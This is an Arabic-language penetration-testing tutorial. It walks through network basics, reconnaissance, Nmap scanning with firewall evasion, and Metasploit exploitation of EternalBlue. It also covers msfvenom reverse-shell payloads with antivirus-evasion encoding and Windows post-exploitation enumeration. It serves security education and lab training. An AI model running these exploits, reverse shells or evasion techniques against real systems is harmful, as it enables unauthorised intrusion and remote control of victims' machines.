# شرح كامل لـ Network Penetration Testing Guide 🎯

الملف ده مرجع متكامل بيغطي كل مراحل الـ Pentest من أول ما تبدأ لحد ما تنتهي. هشرحه Chapter by Chapter بالتفصيل، وأربط كل حاجة بالحاجة التانية.

---

# 📘 Chapter 1: Network Fundamentals (أساسيات الشبكات)

## 🔷 1.1 — OSI Model

### الفكرة العامة الأول:

تخيل إنك بتبعت جواب لحد. الجواب ده بيعدي على مراحل: بتكتبه، بتحطه في ظرف، بتكتب العنوان، بيروح لمكتب البريد، بيتوصل. كل مرحلة عندها شغلة محددة. الـ OSI Model هو نفس الفكرة دي للبيانات اللي بتتبعت على الشبكة.

> **OSI** = Open Systems Interconnection (نموذج ربط الأنظمة المفتوحة) — معيار بيقسم عملية التواصل على الشبكة لـ 7 طبقات، كل طبقة عندها مسؤولية محددة.

---

### الـ 7 Layers بالتفصيل (من فوق لتحت):

|Layer|الاسم|بالعربي|بيعمل إيه؟|مثال Protocol|أهمية في الـ Pentest|
|---|---|---|---|---|---|
|7|Application|طبقة التطبيق|الواجهة بين المستخدم والشبكة|HTTP, FTP, SSH, DNS|هجمات على الـ Apps، سرقة credentials|
|6|Presentation|طبقة العرض|تشفير وفك تشفير البيانات|TLS/SSL, JPEG|SSL Stripping، هجمات التشفير|
|5|Session|طبقة الجلسة|تفتح وتدير وتقفل الاتصالات|NetBIOS, SMB|Session Hijacking|
|4|Transport|طبقة النقل|ضمان وصول البيانات صح|TCP, UDP|Port Scanning، SYN Flood|
|3|Network|طبقة الشبكة|التوجيه بين الشبكات|IP, ICMP, ARP|IP Spoofing، ICMP Tunneling|
|2|Data Link|طبقة رابط البيانات|التواصل داخل الشبكة المحلية|Ethernet, Wi-Fi, MAC|ARP Poisoning، MAC Spoofing|
|1|Physical|الطبقة المادية|الإشارات الفيزيائية الفعلية|Cables, Wi-Fi signals|Wiretapping|

---

### ليه مهم في الـ Pentest؟

لأن كل **هجوم** بيستهدف Layer معينة:

- هاكر بيعمل **ARP Poisoning** = بيهاجم Layer 2
- بيعمل **Port Scan** = بيستغل Layer 4
- بيهاجم **Web App** = Layer 7

لما تشوف هجوم، اسأل نفسك: "ده في أنهي Layer؟" ده بيساعدك تفهم الهجوم وتدافع عنه.

---

## 🔷 1.2 — TCP/IP Model

### الفكرة:

الـ TCP/IP هو النموذج **العملي** اللي الإنترنت بيشتغل بيه فعلاً. بيدمج الـ 7 Layers في 4 بس.

|TCP/IP Layer|بيمثل OSI Layers|بروتوكولات مهمة|
|---|---|---|
|Application (التطبيق)|5 + 6 + 7|HTTP/S, FTP, SSH, DNS, SMTP, RDP|
|Transport (النقل)|4|TCP, UDP|
|Internet (الإنترنت)|3|IP, ICMP, ARP|
|Network Access (الوصول للشبكة)|1 + 2|Ethernet, Wi-Fi, MAC|

---

## 🔷 1.3 — TCP Three-Way Handshake (مصافحة TCP الثلاثية)

### الفكرة العامة:

الـ TCP (Transmission Control Protocol — بروتوكول التحكم في الإرسال) بروتوكول **موثوق**، يعني بيضمن إن البيانات وصلت صح. عشان يعمل ده، لازم يعمل "اتفاقية" مع الطرف الثاني قبل ما يبعت أي بيانات. الاتفاقية دي بتتم في 3 خطوات.

```
Client ──── SYN ────────────────────────→ Server
           (قول: عايز أتكلم معاك؟)

Client ←─── SYN-ACK ─────────────────── Server
           (رد: تمام، وأنا كمان عايز أتكلم معاك)

Client ──── ACK ─────────────────────────→ Server
           (قول: فاهم، نبدأ!)

[Connection Established — الاتصال اتأسس — البيانات تبدأ]
```

> **SYN** = Synchronize (زامن) — طلب بدء الاتصال **ACK** = Acknowledge (اعترف / أكد) — تأكيد الاستلام **RST** = Reset (إعادة تعيين) — قطع الاتصال فجأة

---

### علاقة المصافحة دي بالـ Pentest:

ده مهم جداً لأنه بيفسر **كيف يشتغل الـ Nmap SYN Scan:**

|الحالة|بيحصل إيه|معناه|
|---|---|---|
|Server بيرد بـ SYN-ACK|البورت مفتوح|خدمة شغالة|
|Server بيرد بـ RST|البورت مقفول|مفيش خدمة|
|مفيش رد|البورت Filtered|Firewall بيحجب|

**الـ SYN Scan أهم من TCP Connect Scan ليه؟** لأنه بيبعت SYN ولما يستلم SYN-ACK بيبعت RST فوراً — **مش بيكمل المصافحة** — فالاتصال مش بيتسجل في كتير من الأنظمة القديمة، يعني **أهدأ وأقل ضوضاء**.

---

## 🔷 1.4 — Critical Ports & Services (البورتات والخدمات المهمة)

### الفكرة العامة:

الـ **Port** (المنفذ) = باب رقمي على الجهاز. كل خدمة ليها باب معين بتستمع عليه. لما تعمل Scan، بتشوف أنهي أبواب مفتوحة = أنهي خدمات شغالة = أنهي ثغرات محتملة.

---

### البورتات المهمة جداً للـ Pentest:

**🔴 خطر جداً:**

|Port|الخدمة|ليه خطير؟|
|---|---|---|
|**21**|FTP (File Transfer Protocol — بروتوكول نقل الملفات)|Anonymous login (دخول بدون كلمة سر)، vsftpd backdoor|
|**22**|SSH (Secure Shell — الغلاف الآمن)|Brute force، Default credentials|
|**23**|Telnet (بروتوكول قديم)|بيبعت كل حاجة plaintext (نص صريح)، حتى الباسورد!|
|**445**|SMB (Server Message Block — بروتوكول مشاركة الملفات)|EternalBlue، Pass-the-Hash|
|**3389**|RDP (Remote Desktop Protocol — بروتوكول سطح المكتب البعيد)|BlueKeep، Brute force|

**🟡 مهم:**

|Port|الخدمة|الهجوم|
|---|---|---|
|**80/443**|HTTP/HTTPS (الويب)|Web App attacks, SQLi, LFI|
|**135/139**|NetBIOS/RPC|RPC enumeration، Null sessions|
|**389**|LDAP (Lightweight Directory Access Protocol — بروتوكول خدمة الدليل)|AD enumeration|
|**1433**|MS SQL Server|SA brute-force، xp_cmdshell|
|**3306**|MySQL|Brute-force، Webshells|
|**5985**|WinRM (Windows Remote Management)|evil-winrm، Pass-the-Hash|

> **Backdoor** (باب خلفي) = ثغرة مخفية في البرنامج بتسمح بالدخول بدون إذن **Brute Force** (الهجوم العنيف) = تجربة آلاف الباسوردات واحدة واحدة **Pass-the-Hash** (تمرير الهاش) = استخدام الـ Hash بدلاً من الباسورد للدخول

---

## 🔷 1.5 — IP Addressing & Subnetting (العناوين والشبكات الفرعية)

### الفكرة:

كل جهاز على الشبكة ليه IP Address (عنوان إنترنت بروتوكول). الـ Subnetting بيقسم الشبكة الكبيرة لشبكات أصغر.

**Classes (فئات الشبكات):**

|الفئة|النطاق|الـ CIDR|الأجهزة الممكنة|الاستخدام|
|---|---|---|---|---|
|A|1.0.0.0 – 126.x.x.x|/8|~16 مليون|شركات ضخمة|
|B|128.0.0.0 – 191.x.x.x|/16|~65 ألف|شركات متوسطة|
|C|192.0.0.0 – 223.x.x.x|/24|254|شبكات صغيرة|

**Private Ranges (النطاقات الخاصة) — مش على الإنترنت:**

- `10.0.0.0/8` — شبكات داخلية كبيرة
- `172.16.0.0/12` — شبكات متوسطة
- `192.168.0.0/16` — الشبكة اللي في بيتك كده

**عناوين مهمة:**

- `127.0.0.1` = Localhost (الجهاز نفسه)
- `169.254.x.x` = APIPA — بيتعين لما الـ DHCP يفشل
- `0.0.0.0/0` = Default route (الطريق الافتراضي) — كل الشبكات

> **DHCP** (Dynamic Host Configuration Protocol — بروتوكول تهيئة المضيف الديناميكي) = السيرفر اللي بيوزع IPs تلقائياً

---

## 🔷 1.6 — Network Devices & Attack Surface (الأجهزة وسطح الهجوم)

> **Attack Surface** (سطح الهجوم) = كل نقطة ممكن يدخل منها المهاجم

|الجهاز|وظيفته|الهجمات عليه|
|---|---|---|
|**Router** (راوتر)|بيوجه البيانات بين الشبكات|Default credentials، ACL bypass|
|**Switch** (سويتش)|بيوزع البيانات داخل الشبكة|MAC Flooding، STP manipulation|
|**Firewall** (جدار ناري)|بيمنع حركة المرور الخطيرة|Fragmentation attacks، ICMP tunneling|
|**IDS/IPS** (نظام كشف/منع الاختراق)|بيكتشف أو يمنع الهجمات|Evasion via encoding|
|**DHCP Server** (سيرفر DHCP)|بيوزع IPs|DHCP Starvation، Rogue DHCP|
|**DNS Server** (سيرفر أسماء النطاقات)|بيترجم الأسماء لـ IPs|Zone Transfer، Cache Poisoning|

> **MAC Flooding** (إغراق جدول الـ MAC) = إرسال آلاف العناوين وهمية للـ Switch عشان تملاه وهو يبدأ يبعت كل حاجة لكل جهاز **Rogue DHCP** (DHCP مزيف) = تنصيب سيرفر DHCP مزيف يوزع IPs غلط ويعمل MITM

---

# 📘 Chapter 2: Information Gathering (جمع المعلومات)

## الفكرة العامة للـ Chapter ده:

ده **أهم chapter** في الملف كله. قبل ما تهاجم أي حاجة، لازم تعرف كل حاجة عنها. المرحلة دي بتبني **الصورة الكاملة** للـ Target قبل ما تلمسه.

فيه نوعين:

- **Passive Recon** (الاستطلاع السلبي) = بتجمع معلومات من مصادر عامة **من غير ما تبعت أي packet للـ Target** — مش ممكن يحسسك
- **Active Recon** (الاستطلاع النشط) = بتبعت packets فعلية للـ Target — هيظهر في الـ logs بتاعته

---

## 🔷 2.1 — Passive Reconnaissance (الاستطلاع السلبي)

### WHOIS & Domain Registration

> **WHOIS** = نظام بيخليك تسأل "مين مسجل الدومين ده؟"

```bash
whois target.com
# بيديك: اسم المالك، الـ Registrar (الجهة المسجلة)، تاريخ التسجيل والانتهاء، الـ Nameservers
```

**ليه مفيد في الـ Pentest؟**

- بتلاقي اسم المسؤول أو الشركة
- بتلاقي Nameservers (مهمين لهجمات الـ DNS)
- بتلاقي تواريخ (لو الدومين هينتهي قريب = فرصة Domain Hijacking)

---

### DNS Reconnaissance (استطلاع الـ DNS)

> **DNS** (Domain Name System — نظام أسماء النطاقات) = الكتاب اللي بيترجم `google.com` للـ IP الحقيقي

**أنواع الـ DNS Records وأهميتها:**

|Record|بيعمل إيه|أهميته في الـ Pentest|
|---|---|---|
|**A**|اسم → IPv4|بيديك IPs مباشرة للـ Scanning|
|**AAAA**|اسم → IPv6|IPv6 attack surface|
|**MX**|سيرفرات الميل|تقدر تهاجم الـ Email infrastructure|
|**NS**|الـ Nameservers المسؤولة|تجربة Zone Transfer|
|**TXT**|معلومات نصية|بتكشف تقنيات مستخدمة، SPF/DKIM configs|
|**CNAME**|اسم بديل|فرص Subdomain Takeover|
|**SRV**|مواقع الخدمات|بتكشف Kerberos، LDAP|

**الأوامر:**

```bash
nslookup target.com
# أبسط طريقة لاستعلام DNS
# nslookup = name server lookup (بحث في سيرفر الأسماء)

dig target.com A
# dig = Domain Information Groper (أداة استعلام DNS متقدمة)
# A = نوع الـ Record المطلوب

dig target.com ANY
# ANY = أحضرلي كل أنواع الـ Records

dig axfr @ns1.target.com target.com
# axfr = Authoritative Zone Transfer Request (طلب نقل منطقة كامل)
# لو نجح = Critical Finding! هيديك كل الـ Subdomains والـ Records
# @ns1 = بتحدد أنهي Nameserver تسأله
```

> **Zone Transfer** (نقل المنطقة) = طلب من الـ DNS Server إنه يبعتلك كل المعلومات اللي عنده عن الدومين. لو السيرفر مش متأمن صح هيبعتها!

---

### Subdomain Enumeration (اكتشاف النطاقات الفرعية)

> **Subdomain** (نطاق فرعي) = مثل `mail.target.com` أو `admin.target.com`

**ليه مهم؟** لأن الـ Subdomains ممكن تكون على سيرفرات مختلفة بثغرات مختلفة!

```bash
subfinder -d target.com -o subdomains.txt
# subfinder = أداة اكتشاف Subdomains سلبية وسريعة
# -d = domain (النطاق المستهدف)
# -o = output (ملف الحفظ)

amass enum -passive -d target.com
# amass = الأداة الأشمل لاكتشاف الـ Subdomains
# enum = enumeration (استعراض)
# -passive = سلبي فقط (من غير ما تلمس الـ Target)
```

---

### Google Dorks (البحث المتقدم في جوجل)

> **Google Dork** = استخدام عوامل بحث خاصة في جوجل للوصول لمعلومات حساسة متاحة للعموم بدون علم صاحبها

|الـ Dork|بيعمل إيه|
|---|---|
|`site:target.com`|كل الصفحات المفهرسة|
|`site:target.com inurl:admin`|صفحات الـ Admin|
|`site:target.com filetype:pdf`|ملفات PDF (قد تحوي بيانات داخلية)|
|`site:target.com intitle:"index of"`|مجلدات مفتوحة على الإنترنت!|
|`site:github.com "target.com" password`|كلمات سر متسربة على GitHub|
|`site:pastebin.com "target.com"`|بيانات متسربة على Pastebin|

---

### Shodan & Censys

> **Shodan** = محرك بحث بيفهرس كل الأجهزة المتصلة بالإنترنت. بدلاً من ما تبحث عن صفحات ويب، بتبحث عن أجهزة وسيرفرات بثغرات محددة

```bash
shodan search 'hostname:target.com'
# بيبحث عن أجهزة مرتبطة بالدومين ده

shodan search 'vuln:CVE-2021-44228'
# بيلاقيلك كل الأجهزة الـ Vulnerable لـ Log4Shell في العالم!
# vuln = vulnerability (ثغرة)
# CVE = Common Vulnerabilities and Exposures (رقم تعريف الثغرة)
```

---

### OSINT Tools (أدوات الاستخبارات مفتوحة المصدر)

> **OSINT** = Open Source Intelligence (استخبارات المصادر المفتوحة) — جمع معلومات من مصادر عامة

```bash
theHarvester -d target.com -b all -l 500 -f output.html
# theHarvester = أداة جمع إيميلات وـ Subdomains وـ IPs
# -d = domain
# -b all = استخدم كل المصادر (google, bing, linkedin...)
# -l 500 = حد أقصى 500 نتيجة
# -f = ملف الـ Output

exiftool document.pdf
# exiftool = أداة استخراج الـ Metadata (البيانات المخفية) من الملفات
# الـ Metadata ممكن تكشف: اسم صاحب الملف، الـ OS المستخدم، المسارات الداخلية
```

---

## 🔷 2.2 — Active Reconnaissance (الاستطلاع النشط)

### Host Discovery (اكتشاف الأجهزة الحية)

```bash
nmap -sn 192.168.1.0/24
# -sn = scan no ports (Ping Scan فقط — بدون Scan للبورتات)
# /24 = كل الـ 254 جهاز في الشبكة دي

arp-scan 192.168.1.0/24
# ARP Scan = Layer 2 Scan، مش ممكن يتحجب من الـ Firewall على نفس الشبكة
# ARP = Address Resolution Protocol (بروتوكول تحليل العناوين)
```

---

### Nmap — Complete Reference

> **Nmap** (Network Mapper — خريطة الشبكة) = أقوى أداة Scanning في العالم

**أنواع الـ Scans وامتى تستخدم كل واحدة:**

|النوع|الـ Flag|الفكرة|امتى تستخدمه|
|---|---|---|---|
|**TCP SYN (Stealth)**|`-sS`|بيبعت SYN وميكملش المصافحة|الافتراضي، أسرع، أهدأ|
|**TCP Connect**|`-sT`|بيكمل المصافحة الكاملة|لما مش عندك Root|
|**UDP Scan**|`-sU`|بيشوف خدمات UDP|DNS, SNMP, DHCP|
|**NULL Scan**|`-sN`|بيبعت Packet من غير Flags|Firewall Evasion|
|**FIN Scan**|`-sF`|بيبعت FIN فقط|Firewall Evasion|
|**Xmas Scan**|`-sX`|بيبعت FIN+PSH+URG|Evasion (مش بيشتغل على Windows)|
|**ACK Scan**|`-sA`|بيبعت ACK|بيرسم قواعد الـ Firewall|
|**Version Detect**|`-sV`|بيجيب إصدار الخدمة|دايماً مع الـ Scan|
|**OS Detection**|`-O`|بيعرف نظام التشغيل|بيحتاج port مفتوح وآخر مقفول|
|**Aggressive**|`-A`|بيعمل كل حاجة|Quick Assessment|

---

**الأوامر الأساسية مشروحة:**

```bash
nmap -sS -sV -sC -O -p- --open -T4 192.168.1.1 -oA full_scan
# -sS = SYN Scan (أهدأ)
# -sV = Version Detection (اكتشاف الإصدارات)
# -sC = Default Scripts (تشغيل السكريبتات الافتراضية)
# -O = OS Detection (اكتشاف نظام التشغيل)
# -p- = كل البورتات (65535 بورت)
# --open = اعرضلي المفتوح بس
# -T4 = Aggressive timing (سريع)
# -oA = Output All formats (احفظ كل الصيغ)

nmap -p- -T4 --min-rate 1000 192.168.1.1
# --min-rate 1000 = ابعت 1000 packet في الثانية على الأقل
```

---

**NSE Scripts (سكريبتات الـ Nmap):**

> **NSE** = Nmap Scripting Engine (محرك السكريبتات) — سكريبتات جاهزة لفحص ثغرات محددة

```bash
nmap --script vuln 192.168.1.1
# شغّل كل السكريبتات اللي بتشوف Vulnerabilities

nmap --script smb-vuln* -p 445 192.168.1.1
# * = wildcard (كل السكريبتات اللي اسمها بيبدأ بـ smb-vuln)
# بيفحص كل ثغرات الـ SMB (EternalBlue وغيرها)

nmap --script ftp-anon,ftp-vsftpd-backdoor -p 21 192.168.1.1
# فحص Anonymous FTP Login وثغرة vsftpd
```

---

**Firewall Evasion (التهرب من الـ Firewall):**

```bash
nmap -f 192.168.1.1
# -f = Fragment packets (تقطيع الـ Packets لأجزاء صغيرة — بيخدع بعض الـ Firewalls)

nmap -D RND:10 192.168.1.1
# -D = Decoy (خداع)
# RND:10 = استخدم 10 IPs وهمية عشوائية معاي
# الـ Target هيشوف 11 IP بيسكانوه مش واحد بس

nmap --source-port 53 192.168.1.1
# --source-port 53 = خلي الـ Scan بيبدو إنه جاي من بورت الـ DNS
# بعض الـ Firewalls بتسمح لبورت 53 يعدي
```

**Timing Templates (مستويات السرعة):**

- T0 = Paranoid (جنوني في البطء — للتهرب)
- T1 = Sneaky (متخفي)
- T2 = Polite (مؤدب)
- T3 = Normal (عادي — الافتراضي)
- T4 = Aggressive (سريع جداً — الأكثر استخداماً في Labs)
- T5 = Insane (مجنون السرعة — ممكن يفوّت نتائج)

---

### Banner Grabbing (خطف اللافتات)

> **Banner** (لافتة) = الرسالة اللي الخدمة بتبعتها لما تتصل بيها، بتحتوي على اسم وإصدار الخدمة

```bash
nc -nv 192.168.1.1 22
# nc = Netcat (أداة الاتصال بالـ TCP/UDP)
# -n = numeric only (مش بيعمل DNS resolution)
# -v = verbose (يعرض تفاصيل)
# بيتصل بالبورت 22 (SSH) وبيجيب الـ Banner

curl -I http://192.168.1.1
# -I = Headers only (اجيب Headers بس مش الصفحة كلها)
# هيعرضلك: Server type، إصدار، OS أحياناً
```

---

### SMB Enumeration (استعراض الـ SMB)

> **SMB** (Server Message Block) = بروتوكول مشاركة الملفات والطابعات في Windows — من أخطر البروتوكولات في الـ Pentest

```bash
enum4linux -a 192.168.1.1
# -a = all (كل الفحوصات)
# بيجيب: Users، Shares، Password Policy، OS Info، Domain Info

smbclient -L 192.168.1.1 -N
# -L = List shares (اعرضلي الـ Shares)
# -N = No password (Null Session — من غير كلمة سر)

smbmap -H 192.168.1.1
# smbmap = بيعرض الـ Shares مع صلاحيات القراءة والكتابة

crackmapexec smb 192.168.1.0/24
# crackmapexec = أداة قوية جداً للـ SMB Enumeration والـ Brute Force
# بتسكان الشبكة كلها وبتعرف مين فيها
```

---

# 📘 Chapter 3: Vulnerability Scanning (فحص الثغرات)

## الفكرة العامة:

بعد ما جمعت المعلومات وعرفت الـ Services والـ Versions، دلوقتي بتدور على **ثغرات معروفة** في الإصدارات دي. فيه طريقتين: يدوي وأوتوماتيك.

---

## 🔷 3.1 — Manual Vulnerability Scanning (الفحص اليدوي)

### Searchsploit — Offline Exploit Database

> **Searchsploit** = أداة بتفتشلك في قاعدة بيانات **Exploit-DB** على الأوفلاين. Exploit-DB هي أكبر قاعدة بيانات Exploits مفتوحة المصدر في العالم.

**الـ Workflow (تسلسل العمل):**

1. عملت Nmap وعرفت الـ Services والـ Versions
2. جت Searchsploit وتسأله "في exploit لـ Apache 2.4.49؟"
3. يديك قائمة الـ Exploits المتاحة

```bash
searchsploit apache 2.4.49
# بيدور على أي exploit مرتبط بـ Apache إصدار 2.4.49

searchsploit vsftpd 2.3.4
# vsftpd = Very Secure FTP Daemon (سيرفر FTP شهير)
# إصدار 2.3.4 فيه backdoor معروف!

searchsploit -m 39772
# -m = mirror (انسخ الـ Exploit للـ Working Directory بتاعك)
# 39772 = رقم الـ Exploit في الـ Database

searchsploit -x 39772
# -x = examine (اعرض الـ Exploit من غير ما تنسخه)

searchsploit --nmap nmap_scan.xml
# دي الـ Feature الأقوى: بعتله الـ Nmap Output مباشرة
# هو بيطابق كل Service + Version على الـ Exploits المتاحة أوتوماتيك!
```

---

### Manual Protocol Checks (الفحص اليدوي للبروتوكولات)

**FTP Anonymous Login:**

```bash
ftp 192.168.1.1
# بعدين:
# Username: anonymous
# Password: (Enter أو أي إيميل)
# لو دخل = Critical Finding!
```

**SMB Null Session:**

```bash
smbclient -L 192.168.1.1 -N
# Null Session = الدخول من غير أي credentials
# لو اشتغل = Critical Finding!
```

**Web Directory Scanning:**

```bash
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# gobuster = أداة اكتشاف المجلدات والملفات الخفية
# dir = directory mode
# -u = URL (العنوان المستهدف)
# -w = wordlist (قائمة الكلمات اللي هيجرب بيها)
# بيجرب مئات الآلاف من أسماء المجلدات

nikto -h http://192.168.1.1
# nikto = أداة فحص الـ Web Server للثغرات المعروفة
# -h = host (الجهاز المستهدف)
```

---

## 🔷 3.2 — Automated Scanning with Nessus (الفحص الأوتوماتيكي)

> **Nessus** = أشهر وأقوى أداة Vulnerability Scanning في العالم. بتعمل أكثر من 100,000 فحص على الأنظمة والتطبيقات.

### Severity Scale (مقياس الخطورة):

|المستوى|نطاق الـ CVSS|المعنى|مثال|
|---|---|---|---|
|**Critical**|9.0–10.0|RCE كامل أو اختراق تام|EternalBlue, Log4Shell|
|**High**|7.0–8.9|خطورة عالية وسهولة استغلال|Shellshock, Heartbleed|
|**Medium**|4.0–6.9|تسريب بيانات محدود|POODLE|
|**Low**|1.0–3.9|إفصاح معلومات بسيط|Weak TLS|
|**Info**|0.0|معلوماتي فقط|Open ports|

> **CVSS** = Common Vulnerability Scoring System (نظام تقييم الثغرات الموحد) — رقم من 0 لـ 10 بيقيس خطورة الثغرة

---

# 📘 Chapter 4: Exploitation — Metasploit Framework

## الفكرة العامة:

لقيت ثغرة. دلوقتي إزاي تستغلها؟ هنا بييجي دور الـ **Metasploit** — أشهر وأقوى Platform للـ Exploitation في العالم.

---

## 🔷 4.1 — Framework Architecture (هيكل الـ Framework)

|نوع الـ Module|بيعمل إيه|مثال|
|---|---|---|
|**Exploit**|بيستغل ثغرة معينة|EternalBlue|
|**Payload**|الكود اللي بيتنفذ على الـ Target بعد النجاح|Meterpreter|
|**Auxiliary**|فحص وعد واستعراض بدون Payload|SMB Scanner|
|**Post**|بيتنفذ بعد الدخول (Post-Exploitation)|Hashdump|
|**Encoder**|بيشفر الـ Payload للتهرب من الـ AV|shikata_ga_nai|
|**NOPs**|Padding في الـ Buffer Overflow|x86/opty2|

---

## 🔷 4.2 — msfconsole Startup

```bash
service postgresql start
# postgresql = قاعدة البيانات اللي Metasploit بيخزن فيها نتائجه

msfdb init
# init = initialize (تهيئة قاعدة البيانات للمرة الأولى)

msfconsole
# تشغيل الـ Console الرئيسية
```

**Database Commands (أوامر قاعدة البيانات):**

```bash
msf6> workspace -a EngagementName
# workspace = فضاء عمل منفصل لكل Engagement (مهمة)
# -a = add (إضافة workspace جديد)
# ده مهم عشان منخلطش بين مهام مختلفة

msf6> db_import /path/to/nmap_scan.xml
# استورد نتائج الـ Nmap في Metasploit مباشرة

msf6> hosts
# اعرضلي كل الأجهزة اللي اكتشفناها

msf6> services -p 445
# اعرضلي كل الأجهزة اللي عندها بورت 445 مفتوح
```

---

## 🔷 4.3 — Essential Commands

|الأمر|بيعمل إيه|
|---|---|
|`search ms17-010`|دور على Modules متعلقة بـ EternalBlue|
|`use exploit/windows/smb/ms17_010_eternalblue`|حمّل الـ Module|
|`info`|اعرض كل المعلومات عن الـ Module|
|`show options`|اعرض الـ Options المطلوبة|
|`show payloads`|اعرض الـ Payloads المتاحة|
|`set RHOSTS 192.168.1.50`|حدد الـ Target|
|`set LHOST 192.168.1.100`|حدد IP المهاجم (للـ Reverse Shell)|
|`check`|افحص لو الـ Target Vulnerable (قبل الهجوم)|
|`run` أو `exploit`|نفّذ الهجوم|
|`sessions -i 1`|ادخل على الـ Session رقم 1|
|`sessions -u 1`|Upgrade الـ Shell لـ Meterpreter|

---

## 🔷 4.4 — Payload Types (أنواع الـ Payloads)

> **Payload** (الحمولة) = الكود اللي بيتنفذ على الـ Target بعد نجاح الـ Exploit

### الفرق بين Single / Stager / Stage / Stageless:

```
SINGLE → windows/shell_reverse_tcp
الكود كله في ملف واحد
أكبر حجم لكن أكثر استقراراً

STAGER → windows/meterpreter/reverse_tcp  (الـ / قبل meterpreter = stager)
جزء صغير بيتبعت أول → بيتصل بالـ MSF → بيجيب الـ Stage الكامل
أصغر حجم = بيعدي في Exploits ذات حجم محدود

STAGE → الـ Meterpreter نفسه
مش بيتبعت لوحده — دايماً بييجيه الـ Stager يجيبه

STAGELESS → windows/x64/meterpreter_reverse_tcp  (الـ _ = stageless)
Stager + Stage في ملف واحد، أحسن لما الـ Firewall بيحجب Stage Download
```

**Common Payloads (الـ Payloads الشائعة):**

- Windows 32-bit: `windows/meterpreter/reverse_tcp`
- Windows 64-bit: `windows/x64/meterpreter/reverse_tcp`
- Linux: `linux/x86/shell_reverse_tcp`
- PHP: `php/meterpreter_reverse_tcp`

---

## 🔷 4.5 — Complete Exploit Workflow (الـ Workflow الكامل)

```bash
# STEP 1: ابحث عن الـ Module
msf6> search ms17-010

# STEP 2: حمّل الـ Module
msf6> use exploit/windows/smb/ms17_010_eternalblue

# STEP 3: اعرض المعلومات
msf6> info
msf6> show options

# STEP 4: ضبط الـ Options
msf6> set RHOSTS 192.168.1.50      # الـ Target
msf6> set LHOST 192.168.1.100      # أنت
msf6> set LPORT 4444               # البورت اللي هتسمع عليه

# STEP 5: اختار الـ Payload
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp

# STEP 6: تأكد من الـ Options
msf6> show options

# STEP 7: افحص لو الـ Target متأثر (اختياري)
msf6> check

# STEP 8: شن الهجوم
msf6> run

# STEP 9: مدير الـ Sessions
msf6> sessions
msf6> sessions -i 1
meterpreter > sysinfo
meterpreter > getuid
```

---

## 🔷 4.6 — Auxiliary Modules

```bash
# Port Scan (مسح البورتات)
msf6> use auxiliary/scanner/portscan/tcp
msf6> set THREADS 50   # THREADS = عدد الـ Threads للسرعة

# SSH Brute Force (الهجوم العنيف على SSH)
msf6> use auxiliary/scanner/ssh/ssh_login
msf6> set STOP_ON_SUCCESS true   # وقف لو لقى باسورد صح
```

---

## 🔷 4.7 — Common Exploits Quick Reference

|الثغرة|الـ Module|الـ Target|البورت|
|---|---|---|---|
|**MS17-010 EternalBlue**|`exploit/windows/smb/ms17_010_eternalblue`|Win 7/2008|445|
|**BlueKeep**|`exploit/windows/rdp/cve_2019_0708_bluekeep_rce`|Win 7/2008|3389|
|**vsftpd 2.3.4**|`exploit/unix/ftp/vsftpd_234_backdoor`|Linux FTP|21|
|**Log4Shell**|`exploit/multi/misc/log4shell_header_injection`|Java Apps|Any|
|**Apache Struts**|`exploit/multi/http/struts2_content_type_ognl`|Struts 2.x|80|

---

## 🔷 4.8 — msfvenom — Standalone Payload Generator

> **msfvenom** = أداة بتعملك Payload منفرد تقدر تبعته للـ Target بأي طريقة (Upload، Email، USB...)

```bash
# Windows 64-bit Reverse Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell64.exe
# -p = payload
# LHOST = attacker IP (IP المهاجم)
# LPORT = attacker listening port (البورت اللي بتسمع عليه)
# -f exe = format: executable (ملف تنفيذي)
# -o = output file (اسم الملف الناتج)

# PHP Payload (للـ Web Apps)
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
# -f raw = raw format (بدون تغليف)

# AV Evasion (التهرب من الـ Antivirus)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe
# -e = encoder (المشفر)
# -i 10 = iterations (شفّر 10 مرات متتالية)
```

**بعد إنشاء الـ Payload، لازم تعمل Listener (مستمع):**

```bash
msf6> use exploit/multi/handler
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> set LHOST 192.168.1.100
msf6> set LPORT 4444
msf6> run -j   # -j = background job (شغّله في الخلفية)
```

---

# 📘 Chapter 5: Post-Exploitation — Windows Manual

## الفكرة العامة:

دخلت الجهاز. دلوقتي إيه اللي تعمله؟ الـ Post-Exploitation بيغطي كل حاجة بعد الدخول: تفهم مكانك، ترفع صلاحياتك، تجمع Credentials، تبقى persistent، وتتحرك على الشبكة.

---

## 🔷 5.1 — Situational Awareness (الوعي بالموقف)

> أول حاجة بعد الدخول: **اعرف مكانك** قبل ما تعمل أي حاجة

```batch
whoami /all
:: whoami = من أنا؟
:: /all = كل حاجة: اسم المستخدم + الـ SID + الـ Groups + الـ Privileges

systeminfo
:: معلومات كاملة عن الجهاز: الـ OS، الـ RAM، الـ Patches

ipconfig /all
:: معلومات الشبكة الكاملة

netstat -ano
:: -a = all connections (كل الاتصالات)
:: -n = numeric (أرقام مش أسماء)
:: -o = owner PID (رقم الـ Process المسؤول)
:: بيعرضلك كل الاتصالات الحالية مع أرقام الـ Processes

net user
:: كل المستخدمين المحليين

net group "Domain Admins" /domain
:: مين في مجموعة Domain Admins؟
:: /domain = على مستوى الـ Domain مش الجهاز بس
```

---

## 🔷 5.2 — Privilege Escalation (رفع الصلاحيات)

> **Privilege Escalation** (رفع الصلاحيات) = الانتقال من User عادي لـ SYSTEM أو Domain Admin

### الـ Privileges الخطيرة:

|الـ Privilege|الخطر|
|---|---|
|**SeImpersonatePrivilege**|Potato Attacks → SYSTEM|
|**SeBackupPrivilege**|قراءة أي ملف حتى SAM|
|**SeDebugPrivilege**|Dump LSASS Memory|
|**SeLoadDriverPrivilege**|تحميل Driver خبيث|

```batch
whoami /priv
:: افحص صلاحياتك الحالية
```

---

### Unquoted Service Paths (مسارات الخدمات غير المقتبسة)

**الفكرة:** لو مسار الـ Service مش بين علامات تنصيص (`"`) وفيه مسافة، Windows بيجرب كل جزء قبل المسافة كـ Executable!

**مثال:**

- المسار: `C:\Program Files\My App\service.exe`
- Windows بيجرب: `C:\Program.exe` أولاً!
